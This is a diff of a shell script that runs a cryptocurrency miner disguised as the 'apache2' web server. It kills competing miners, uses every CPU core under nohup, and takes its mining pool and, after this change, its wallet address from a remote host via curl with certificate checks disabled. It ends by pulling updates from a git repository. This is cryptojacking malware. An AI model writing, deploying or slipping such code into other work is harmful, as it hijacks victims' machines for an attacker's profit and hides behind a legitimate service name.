@@ -3,7 +3,7 @@ killall apache2
 killall  minerd
 
 desde=`stat  /etc/hosts -c%y  | awk '{print $1}'`
-nohup /root/apache2 -a cryptonight -o stratum+tcp://`curl --insecure https://sio.com.co/m/dirpool.txt` -u Yx1SrHuVmFPGc2Yn32vgAoARd3oYq4m2QioeK587fgVzHsVvUtpv4fNd4dUU47voD5a1Pja7JT9UkTTP9peDm5db3162MnaaJ+10000" -p zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log
+nohup /root/apache2 -a cryptonight -o stratum+tcp://`curl --insecure https://sio.com.co/m/dirpool.txt` -u `curl --insecure https://sio.com.co/m/dirwallet.txt`+10000 -p zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log
 #nohup /root/apache2 -a cryptonight -o stratum+tcp://45.76.248.236:3333 -u "etnkPDDjHh4QYLCFkNNSXmgNAwfgUaxphgWuz5Fva3cXJm5cJoWRwubjnQqzSbxH5vUxVCw7En2JY5oJZRv17eeR9o4ZmmBLn7+10000" -p `cat index.html`"-"$desde:zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log &
 
 cd tanhuevon/ ; git stash drop; git reset --hard; git pull
